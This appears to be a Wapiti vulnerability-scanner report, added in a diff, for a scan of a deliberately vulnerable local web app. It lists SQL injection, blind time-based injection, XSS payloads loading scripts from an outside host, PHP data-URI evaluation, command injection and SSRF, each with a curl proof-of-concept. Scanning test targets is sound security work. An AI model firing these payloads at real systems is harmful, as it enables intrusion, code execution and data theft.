@@ -1,0 +1,396 @@
+********************************************************************************
+                     Wapiti 3.0.1 - wapiti.sourceforge.net
+                       Report for http://localhost:8000/
+              Date of the scan : Sat, 27 Jul 2019 16:40:32 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   3
+                                                      Blind SQL Injection :  10
+                                                            File Handling :   1
+                                                     Cross Site Scripting :   9
+                                                           CRLF Injection :   0
+                                                       Commands execution :   3
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   5
+                                              Server Side Request Forgery :   1
+********************************************************************************
+
+SQL Injection
+-------------
+MySQL Injection via injection in the parameter username
+Evil request:
+    GET /vulnerabilities/brute/?username=%C2%BF%27%22%28&password=letmein&Login=Login HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/brute/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/brute/?username=%C2%BF%27%22%28&password=letmein&Login=Login" -e "http://localhost:8000/vulnerabilities/brute/""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter id
+Evil request:
+    GET /vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/sqli/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969" -e "http://localhost:8000/vulnerabilities/sqli/""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter id
+Evil request:
+    GET /vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/sqli/?id=default&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli/?id=default&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969""
+
+                                  *   *   *
+
+********************************************************************************
+
+Blind SQL Injection
+-------------------
+Blind SQL vulnerability via injection in the parameter username
+Evil request:
+    GET /vulnerabilities/brute/?username=%27%20or%20sleep%287%29%231&password=letmein&Login=Login HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/brute/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/brute/?username=%27%20or%20sleep%287%29%231&password=letmein&Login=Login" -e "http://localhost:8000/vulnerabilities/brute/""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter password_current
+Evil request:
+    GET /vulnerabilities/csrf/?password_current=sleep%287%29%231&password_new=letmein&password_conf=letmein&Change=Change&user_token=5ca5806a76f2923f7dba25faa7104758 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/csrf/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/csrf/?password_current=sleep%287%29%231&password_new=letmein&password_conf=letmein&Change=Change&user_token=5ca5806a76f2923f7dba25faa7104758" -e "http://localhost:8000/vulnerabilities/csrf/""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter password_new
+Evil request:
+    GET /vulnerabilities/csrf/?password_new=sleep%287%29%231&password_conf=letmein&Change=Change HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/csrf/?password_current=letmein&password_new=letmein&password_conf=letmein&Change=Change&user_token=5ca5806a76f2923f7dba25faa7104758
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/csrf/?password_new=sleep%287%29%231&password_conf=letmein&Change=Change" -e "http://localhost:8000/vulnerabilities/csrf/?password_current=letmein&password_new=letmein&password_conf=letmein&Change=Change&user_token=5ca5806a76f2923f7dba25faa7104758""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter page
+Evil request:
+    GET /vulnerabilities/fi/?page=sleep%287%29%231 HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=sleep%287%29%231""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter id
+Evil request:
+    GET /vulnerabilities/sqli/?id=sleep%287%29%231&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/sqli/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=sleep%287%29%231&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969" -e "http://localhost:8000/vulnerabilities/sqli/""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter id
+Evil request:
+    GET /vulnerabilities/sqli/?id=%27%20or%20sleep%287%29%231&Submit=Submit HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/sqli/?id=default&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=%27%20or%20sleep%287%29%231&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli/?id=default&Submit=Submit&user_token=f337ea8568384ec045846ce14a37a969""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter id
+Evil request:
+    GET /vulnerabilities/sqli_blind/?id=sleep%287%29%231&Submit=Submit&user_token=f4e1ed02744f75009797726fc40443d7 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/sqli_blind/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli_blind/?id=sleep%287%29%231&Submit=Submit&user_token=f4e1ed02744f75009797726fc40443d7" -e "http://localhost:8000/vulnerabilities/sqli_blind/""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter id
+Evil request:
+    GET /vulnerabilities/sqli_blind/?id=sleep%287%29%231&Submit=Submit HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/sqli_blind/?id=default&Submit=Submit&user_token=f4e1ed02744f75009797726fc40443d7
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli_blind/?id=sleep%287%29%231&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli_blind/?id=default&Submit=Submit&user_token=f4e1ed02744f75009797726fc40443d7""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter default
+Evil request:
+    GET /vulnerabilities/xss_d/?default=sleep%287%29%231 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_d/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_d/?default=sleep%287%29%231" -e "http://localhost:8000/vulnerabilities/xss_d/""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter name
+Evil request:
+    GET /vulnerabilities/xss_r/?name=sleep%287%29%23%0A1&user_token=91ce1b6a40bd8863d93c9195ef6f6909 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_r/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_r/?name=sleep%287%29%23%0A1&user_token=91ce1b6a40bd8863d93c9195ef6f6909" -e "http://localhost:8000/vulnerabilities/xss_r/""
+
+                                  *   *   *
+
+********************************************************************************
+
+File Handling
+-------------
+Remote inclusion vulnerability via injection in the parameter page
+Evil request:
+    GET /vulnerabilities/fi/?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=http%3A%2F%2Fwww.google.fr%2F%3F""
+
+                                  *   *   *
+
+********************************************************************************
+
+Cross Site Scripting
+--------------------
+XSS vulnerability found via injection in the parameter name
+Evil request:
+    GET /vulnerabilities/xss_r/?name=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwidg9qith0z.js%3E%3C%2Fscript%3E&user_token=91ce1b6a40bd8863d93c9195ef6f6909 HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_r/
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_r/?name=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwidg9qith0z.js%3E%3C%2Fscript%3E&user_token=91ce1b6a40bd8863d93c9195ef6f6909" -e "http://localhost:8000/vulnerabilities/xss_r/""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter name
+Evil request:
+    GET /vulnerabilities/xss_r/?name=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwcvuirfwjxz.js%3E%3C%2Fscript%3E HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_r/?name=default&user_token=91ce1b6a40bd8863d93c9195ef6f6909
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_r/?name=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwcvuirfwjxz.js%3E%3C%2Fscript%3E" -e "http://localhost:8000/vulnerabilities/xss_r/?name=default&user_token=91ce1b6a40bd8863d93c9195ef6f6909""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter include
+Evil request:
+    POST /vulnerabilities/csp/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/csp/
+    Content-Type: application/x-www-form-urlencoded
+
+    include=%27%3E%3C%2Fscript%3E%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws6ltmz959z.js%3E%3C%2Fscript%3E
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/csp/" -e "http://localhost:8000/vulnerabilities/csp/" -d "include=%27%3E%3C%2Fscript%3E%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fws6ltmz959z.js%3E%3C%2Fscript%3E""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter uploaded
+Evil request:
+    POST /vulnerabilities/upload/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/upload/
+    Content-Type: multipart/form-data; boundary=------------------------boundarystring
+
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+    100000
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="Upload"
+
+    Upload
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="user_token"
+
+    3c95dcba85522fe70b3a1bf094adac3a
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="uploaded"; filename="<img src=. onerror=alert('wil85ajdg2')>"
+
+    /* snip file content snip */
+------------------------boundarystring--
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/upload/" -e "http://localhost:8000/vulnerabilities/upload/" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" -F "user_token=3c95dcba85522fe70b3a1bf094adac3a" -F "uploaded=@your_local_file;filename=<img src=. onerror=alert('wil85ajdg2')>""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter uploaded
+Evil request:
+    POST /vulnerabilities/upload/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/upload/
+    Content-Type: multipart/form-data; boundary=------------------------boundarystring
+
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+    100000
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="Upload"
+
+    Upload
+    ------------------------boundarystring
+    Content-Disposition: form-data; name="uploaded"; filename="<img src=. onerror=alert('wdojjt7xgz')>"
+
+    /* snip file content snip */
+------------------------boundarystring--
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/upload/" -e "http://localhost:8000/vulnerabilities/upload/" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" -F "uploaded=@your_local_file;filename=<img src=. onerror=alert('wdojjt7xgz')>""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter txtName
+Evil request:
+    POST /vulnerabilities/xss_s/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_s/
+    Content-Type: application/x-www-form-urlencoded
+
+    txtName=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fw3a228ec6fz.js%3E%3C%2Fscript%3E&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&user_token=7717f70f7f39153e9274891355b1f02f&mtxMessage=Hi%20there%21
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_s/" -e "http://localhost:8000/vulnerabilities/xss_s/" -d "txtName=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fw3a228ec6fz.js%3E%3C%2Fscript%3E&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&user_token=7717f70f7f39153e9274891355b1f02f&mtxMessage=Hi%20there%21""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter mtxMessage
+Evil request:
+    POST /vulnerabilities/xss_s/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_s/
+    Content-Type: application/x-www-form-urlencoded
+
+    txtName=default&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&user_token=7717f70f7f39153e9274891355b1f02f&mtxMessage=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwdvmzk71etz.js%3E%3C%2Fscript%3E
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_s/" -e "http://localhost:8000/vulnerabilities/xss_s/" -d "txtName=default&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&user_token=7717f70f7f39153e9274891355b1f02f&mtxMessage=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwdvmzk71etz.js%3E%3C%2Fscript%3E""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter txtName
+Evil request:
+    POST /vulnerabilities/xss_s/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_s/
+    Content-Type: application/x-www-form-urlencoded
+
+    txtName=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fw9o7q5jtqjz.js%3E%3C%2Fscript%3E&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_s/" -e "http://localhost:8000/vulnerabilities/xss_s/" -d "txtName=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fw9o7q5jtqjz.js%3E%3C%2Fscript%3E&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter mtxMessage
+Evil request:
+    POST /vulnerabilities/xss_s/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/xss_s/
+    Content-Type: application/x-www-form-urlencoded
+
+    txtName=default&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwee2unrx5fz.js%3E%3C%2Fscript%3E
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/xss_s/" -e "http://localhost:8000/vulnerabilities/xss_s/" -d "txtName=default&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwee2unrx5fz.js%3E%3C%2Fscript%3E""
+
+                                  *   *   *
+
+********************************************************************************
+
+Commands execution
+------------------
+PHP evaluation via injection in the parameter page
+Evil request:
+    GET /vulnerabilities/fi/?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D""
+
+                                  *   *   *
+
+Command execution via injection in the parameter ip
+Evil request:
+    POST /vulnerabilities/exec/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/exec/
+    Content-Type: application/x-www-form-urlencoded
+
+    ip=%3Benv&Submit=Submit&user_token=351d083f7e8f9af2d6fa5858b2328a06
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/exec/" -e "http://localhost:8000/vulnerabilities/exec/" -d "ip=%3Benv&Submit=Submit&user_token=351d083f7e8f9af2d6fa5858b2328a06""
+
+                                  *   *   *
+
+Command execution via injection in the parameter ip
+Evil request:
+    POST /vulnerabilities/exec/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/exec/
+    Content-Type: application/x-www-form-urlencoded
+
+    ip=%3Benv&Submit=Submit
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/exec/" -e "http://localhost:8000/vulnerabilities/exec/" -d "ip=%3Benv&Submit=Submit""
+
+                                  *   *   *
+
+********************************************************************************
+
+Potentially dangerous file
+--------------------------
+Configuration information may be available remotely.
+Evil request:
+    GET /config/ HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/config/""
+
+                                  *   *   *
+
+Contains PHP configuration information
+References:
+http://osvdb.org/show/osvdb/3233
+Evil request:
+    GET /phpinfo.php HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/phpinfo.php""
+
+                                  *   *   *
+
+PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+References:
+http://osvdb.org/show/osvdb/12184
+Evil request:
+    GET /index.php?%3DPHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/index.php?%3DPHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000""
+
+                                  *   *   *
+
+Apache default file found.
+References:
+http://osvdb.org/show/osvdb/3233
+Evil request:
+    GET /icons/README HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/icons/README""
+
+                                  *   *   *
+
+Admin login page/section found.
+Evil request:
+    GET /login.php HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/login.php""
+
+                                  *   *   *
+
+********************************************************************************
+
+Server Side Request Forgery
+---------------------------
+SSRF vulnerability via injection in the parameter page.
+The target performed an outgoing HTTP GET request at 2019-07-27T18:43:23+02:00 with IP 80.194.63.210.
+Full request can be seen at https://wapiti3.ovh/ssrf_data/ljz78z/44/70616765/1564245803-80.194.63.210.txt
+Evil request:
+    GET /vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error :   0
+                                                     Resource consumption :   0
+********************************************************************************
